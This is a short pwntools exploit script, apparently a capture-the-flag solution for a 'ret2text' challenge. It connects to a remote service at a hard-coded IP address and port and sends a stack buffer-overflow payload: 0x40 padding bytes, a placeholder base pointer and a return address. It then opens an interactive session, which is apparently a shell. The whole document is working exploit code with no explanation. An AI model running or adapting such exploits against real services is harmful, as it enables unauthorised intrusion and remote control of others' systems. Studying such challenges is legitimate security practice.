from pwn import *

# io = process('./ret2text')
io = remote('43.156.14.141', 1144)

payload = flat(['A' * 0x40, p64(0xdeadbeef), p64(0x4011E5)])

io.sendlineafter('Enter your name:\n', payload)

io.interactive()
